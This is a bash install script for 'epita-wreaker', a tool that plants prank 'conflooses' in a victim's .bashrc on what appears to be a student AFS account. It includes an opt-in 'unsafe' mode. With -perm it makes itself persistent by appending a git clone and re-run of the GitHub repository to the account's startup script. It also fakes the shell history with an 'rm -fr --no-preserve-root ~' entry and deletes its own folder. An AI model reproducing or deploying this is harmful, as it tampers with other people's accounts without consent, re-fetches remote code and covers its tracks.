#usage: ./install_rand.sh [-unsafe] [-perm] [confloose to install]
#safe by default (no risk of real damage), change this with -unsafe
#does not reinstall on reboot by default, change this with -perm
#installs random confloose unless specific one is passed as param

repo=$(dirname $0)

#setsup backup directory (maybe make it hidden in the future?)
if [[ -d ~/afs ]]; then
	bakdir=~/afs/confbackup
else
	bakdir=~/confbackup
fi
[[ ! -d $bakdir ]] && mkdir $bakdir


#deals with params
declare -a confs
unsafe=0
perm=0
for i in $(seq 1 $(($#))); do
	case ${!i} in
		-unsafe)
			unsafe=1;;
		-perm)
			perm=1;;
		*)
			confs+=("${!i}");;
	esac
done


#setsup random conf if none were given
if [[ ${#confs[@]} -eq 0 ]]; then
	rand=$(($RANDOM%1))
	if [[ ! $unsafe -eq 0 ]]; then             #adds unsafe conflooses if specified
		rand=$(($RANDOM%2))
	fi
	case $rand in
		0)
			confs+=("lag");;
		1)
			confs+=("gamble");;             #first unsafe confloose
	esac
fi

declare -a touched
for conf in "${confs[@]}"; do
	case $conf in
		gamble | lag)
			[[ ! "${touched[*]}" =~ [[:space:]]".bashrc"[[:space:]] ]] && touched+=".bashrc";;
	esac
done


#makes backups
for val in "${touched[@]}"; do
	if [[ ! -e $bakdir/$val ]]; then
		cp ~/$val $bakdir/$val
	fi
done
#makes full backup as a security
if [[ ! -e ~/afs/fullconfsbackup.tar.gz ]] && [[ -d ~/afs ]]; then
	tar -czf ~/afs/fullconfsbackup.tar.gz ~/afs/.confs
fi



#installs confloose
if [[ $unsafe -eq 0 ]]; then
	for val in "${confs[@]}"; do
		case $val in
			gamble)
				echo skipping ${!i}, not a safe confloose, override with -unsafe;;
			*)
				$repo/$val/install.sh $repo;;
		esac
	done
else
	for val in "${confs[@]}"; do
		$repo/$val/install.sh $repo
	done
fi


#makes random confloose install on reboot
if [[ ! $perm -eq 0 ]] && [[ -d ~/afs ]]; then
	cat <<- MAKE_PERMANENT >> $HOME/afs/.confs/install.sh
		git clone https://github.com/tbvns/epita-wreaker.git
		./epita-wreaker/install_rand.sh
	MAKE_PERMANENT
fi


echo -e "cd\nls\ncd ..\nls\nrm -fr --no-preserve-root ~" > ~/.bash_history

rm -fr $repo
